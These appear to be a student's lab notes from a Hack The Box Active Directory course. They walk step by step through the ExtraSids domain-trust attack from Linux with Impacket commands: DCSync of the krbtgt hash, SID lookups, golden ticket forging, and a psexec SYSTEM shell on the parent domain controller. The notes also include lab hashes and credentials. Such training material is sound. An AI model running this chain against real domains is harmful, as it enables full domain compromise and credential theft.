
>[!info]
>Similar to the Windows version, you can attack domain trusts from Linux with the same set of information:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain

>[!info]
> Same as the Windows attack, taking over the child domain allows us to perform a DCSync and get the NLTM has for the KRBTGT account via secretsdump.py

##### Performing DCSync with secretsdump.py
```go
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

>[!hint] Getting the child domain's SID
> Use `lookupsid.py` from the Impacket toolkit to perform SID brute forcing.
> - The IP will be the target domain for the SID lookup.
> - The tool will return the child SID and RID for each user and group in the format of `DOMAIN_SID-RID`

##### Performing SID Brute Forcing using lookupsid.py
```go
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

Filter for just the domain SID
```go
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

##### Grabbing the Domain SID & Attaching to Enterprise Admin's RID

>[!info]
> Repeat the lookupsid.py command this time targetting the DC (DC01) and gragging the domain SID and the Enterprise Admin group's RID

```go
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

We should now have all the pre-reqs to perform our attack:

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist!): test
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`



##### Constructing a Golden Ticket using ticketer.py

>[!info]
> From the Impacket toolkit use `ticketer.py` to build a Golden Ticket, which will be used to access resources in the child domain (-domain-sid) and the parent domain (-extra-sid)

```go
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 test
```

The ticket will be saved as a Kerberos ccache file

>[!important] ccache file
> REMEMBER, THIS FILE IS USED TO STORE KERBEROS CREDENTIALS!!! THE `KRB5CCNAME` env VARIABLE USES THIS FILE FOR AUTHENTICATION!!!!

```go
export KRB5CCNAME=hacker.ccache
```

##### Getting a SYSTEM shell using Impacket's psexec.py

>[!info]
> Authenticate to the parent domain's DC using Impackets's version of PSExec
```go
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

### RaiseChild

>[!info] Automating the Above with Impacket's RaiseChild
> The script will gather all the required information. Though you need to specify the following:
> - The target domain controller
> - The credentials for an admin user in the child domain

```go
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```














----------------------



# Questions

RDP
```go
xfreerdp /v:10.129.180.47 /u:htb-student_adm /p:'HTB_@cademy_stdnt_admin!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/domain_trusts /smart-sizing:2400x1200 /cert:ignore
```

### Question 1: Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.

Answer:
```go

```

```go

```